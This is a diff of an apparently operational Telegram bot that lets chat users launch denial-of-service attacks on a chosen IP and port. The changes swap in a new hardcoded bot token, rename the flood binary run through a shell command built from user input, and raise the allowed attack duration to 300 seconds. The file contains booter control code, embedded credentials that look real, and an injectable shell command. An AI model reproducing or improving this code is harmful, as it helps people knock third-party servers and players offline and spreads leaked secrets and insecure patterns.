@@ -9,7 +9,7 @@ import threading
 import time
 
 # Bot token and admin user ID (as strings)
-bot = telebot.TeleBot('7286374610:AAHYHeYxiAROh85mRDDGj3yksZF9PW7YYqY')
+bot = telebot.TeleBot('7503879369:AAFkH0ZtMRekD7FUpSFECtrQU4KgZu_a680')
 admin_id = {"6539807903"}
 
 # Files for data storage
@@ -161,7 +161,7 @@ def start_attack_reply(message, target, port, duration):
 # Function to run the attack using subprocess
 def run_attack(target, port, duration):
     global attack_in_progress, attack_end_time
-    full_command = f"./smokey {target} {port} {duration} smokey"
+    full_command = f"./fuck {target} {port} {duration} 1200"
     subprocess.run(full_command, shell=True)
     # Once the attack finishes, mark the target IP as attacked and clear the global attack flag
     with attack_lock:
@@ -208,8 +208,8 @@ def handle_bgmi(message):
         try:
             port = int(command[2])
             duration = int(command[3])
-            if duration > 240:
-                response = "⚠️ Error: Maximum attack duration is 240 seconds."
+            if duration > 300:
+                response = "⚠️ Error: Maximum attack duration is 300 seconds."
                 bot.reply_to(message, response)
                 return
 
